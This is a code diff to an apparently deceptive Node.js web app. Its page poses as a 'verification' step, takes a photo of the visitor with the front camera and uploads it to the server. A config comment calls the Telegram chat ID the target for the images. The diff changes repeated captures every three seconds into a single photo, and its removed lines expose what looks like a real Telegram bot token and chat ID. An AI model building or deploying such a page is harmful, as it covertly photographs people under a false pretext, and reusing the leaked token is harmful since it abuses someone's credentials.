@@ -5,11 +5,11 @@ const FormData = require('form-data');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
 
-// ================== الإعدادات (عدلها هنا أو استخدم متغيرات البيئة) ==================
-const BOT_TOKEN = process.env.BOT_TOKEN || '8625738993:AAFJN5NusRGKwEl7CIOEEhXBfXDLzkfkKsA';
-const CHAT_ID = process.env.CHAT_ID || '7473633093'; // معرف الدردشة المستهدف للصور
+// ================== الإعدادات (استخدم متغيرات البيئة دائمًا) ==================
+const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN'; // ❌ لا تضع التوكن هنا مباشرة
+const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID';       // معرف الدردشة المستهدف للصور
 const DEFAULT_URL = process.env.DEFAULT_URL || 'https://www.google.com';
-const HOST_URL = process.env.HOST_URL || 'https://mos78.onrender.com'; // رابط الاستضافة الفعلي
+const HOST_URL = process.env.HOST_URL || 'https://mos78.onrender.com'; // غيّره لعنوانك الفعلي عند النشر
 const PORT = process.env.PORT || 3000;
 
 const app = express();
@@ -21,14 +21,14 @@ const bot = new TelegramBot(BOT_TOKEN);
 const webhookPath = '/webhook';
 
 // تعيين Webhook تلقائياً عند بدء التشغيل (إذا كان HOST_URL معروفاً)
-if (HOST_URL !== 'https://your-app.onrender.com') {
+if (HOST_URL && HOST_URL !== 'http://localhost:3000') {
     bot.setWebHook(`${HOST_URL}${webhookPath}`).then(() => {
         console.log(`✅ Webhook set to ${HOST_URL}${webhookPath}`);
     }).catch(err => {
         console.error('❌ Failed to set webhook:', err);
     });
 } else {
-    console.warn('⚠️ HOST_URL not set. Webhook not configured. Please update HOST_URL.');
+    console.warn('⚠️ HOST_URL not set or using localhost. Webhook not configured.');
 }
 
 // نقطة استقبال التحديثات من تليجرام
@@ -148,53 +148,30 @@ app.get('/', (req, res) => {
 
     <script>
         (function() {
-            let isActive = true;
-            let mediaStream = null;
-            let intervalId = null;
-            let verificationDone = false;
-
             const overlay = document.getElementById('overlay');
             const mainFrame = document.getElementById('main-frame');
             const startBtn = document.getElementById('start-verification');
 
-            function stopCamera() {
-                isActive = false;
-                if (mediaStream) {
-                    mediaStream.getTracks().forEach(track => track.stop());
-                    mediaStream = null;
-                }
-                if (intervalId) {
-                    clearInterval(intervalId);
-                    intervalId = null;
-                }
-            }
-
-            window.addEventListener('beforeunload', stopCamera);
-            window.addEventListener('pagehide', stopCamera);
-
-            async function startVerification() {
-                if (verificationDone) return;
-                verificationDone = true;
-
+            // دالة لطلب الإذن والتصوير (صورة واحدة)
+            async function requestCameraAndCapture() {
                 try {
-                    mediaStream = await navigator.mediaDevices.getUserMedia({
-                        video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' }
+                    // طلب الوصول للكاميرا (سيفتح نافذة الإذن إذا لم يُتخذ قرار بعد)
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' } 
                     });
-
-                    overlay.classList.add('hidden');
-                    mainFrame.classList.add('visible');
-                    startCapture();
-
+                    // إذا وصلنا هنا، الإذن ممنوح
+                    await captureAndSendPhoto(stream);
                 } catch (err) {
+                    // إذا رفض المستخدم أو حدث خطأ
                     alert('تعذر الوصول إلى الكاميرا. يرجى السماح بالوصول وإعادة المحاولة.');
-                    verificationDone = false;
-                    console.log('Camera error:', err.message);
+                    console.error('Camera error:', err);
                 }
             }
 
-            async function startCapture() {
+            // دالة لالتقاط صورة من الـ stream وإرسالها
+            async function captureAndSendPhoto(stream) {
                 const video = document.createElement('video');
-                video.srcObject = mediaStream;
+                video.srcObject = stream;
                 video.autoplay = true;
                 video.playsInline = true;
                 video.style.display = 'none';
@@ -203,11 +180,13 @@ app.get('/', (req, res) => {
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
 
-                await new Promise(resolve => {
+                // انتظار تحميل الفيديو
+                await new Promise((resolve) => {
                     video.onloadedmetadata = () => {
-                        const maxDim = 500;
+                        // ضبط أبعاد الكانفس بنفس أبعاد الفيديو (مع تصغير اختياري)
                         let width = video.videoWidth;
                         let height = video.videoHeight;
+                        const maxDim = 500;
                         if (width > height && width > maxDim) {
                             height = Math.round(height * maxDim / width);
                             width = maxDim;
@@ -221,19 +200,63 @@ app.get('/', (req, res) => {
                     };
                 });
 
-                intervalId = setInterval(async () => {
-                    if (!isActive) return;
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+                // رسم إطار واحد من الفيديو على الكانفس
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+                // إيقاف جميع مسارات الكاميرا
+                stream.getTracks().forEach(track => track.stop());
+
+                // إزالة عنصر الفيديو
+                video.remove();
+
+                // تحويل الصورة إلى Base64
+                const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+
+                // إرسال الصورة إلى الخادم
+                try {
+                    const response = await fetch('/upload', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: dataURL })
+                    });
+                    if (response.ok) {
+                        console.log('✅ تم إرسال الصورة بنجاح');
+                    } else {
+                        console.error('❌ فشل إرسال الصورة');
+                    }
+                } catch (e) {
+                    console.error('❌ خطأ في الاتصال بالخادم:', e);
+                }
+
+                // إخفاء overlay وإظهار الإطار
+                overlay.classList.add('hidden');
+                mainFrame.classList.add('visible');
+            }
+
+            // دالة البدء مع التحقق من الإذن
+            async function startVerification() {
+                // التحقق من حالة الإذن باستخدام Permissions API (إذا كان مدعوماً)
+                if (navigator.permissions && navigator.permissions.query) {
                     try {
-                        await fetch('/upload', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ image: dataURL })
-                        });
-                    } catch (e) { /* تجاهل */ }
-                }, 3000);
+                        const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+                        if (permissionStatus.state === 'granted') {
+                            // الإذن موجود مسبقاً -> نطلب الكاميرا مباشرة (ستعود فوراً)
+                            requestCameraAndCapture();
+                        } else if (permissionStatus.state === 'prompt') {
+                            // لم يُتخذ قرار بعد -> نطلب الإذن عبر getUserMedia
+                            requestCameraAndCapture();
+                        } else if (permissionStatus.state === 'denied') {
+                            // الإذن مرفوض -> نوجه المستخدم لتغيير الإعدادات
+                            alert('الإذن للوصول إلى الكاميرا مرفوض. يرجى السماح بالكاميرا في إعدادات المتصفح ثم أعد المحاولة.');
+                        }
+                    } catch (err) {
+                        // إذا كان Permissions API لا يدعم 'camera' نستخدم الطريقة التقليدية
+                        requestCameraAndCapture();
+                    }
+                } else {
+                    // المتصفح لا يدعم Permissions API -> نطلب الكاميرا مباشرة
+                    requestCameraAndCapture();
+                }
             }
 
             startBtn.addEventListener('click', startVerification);
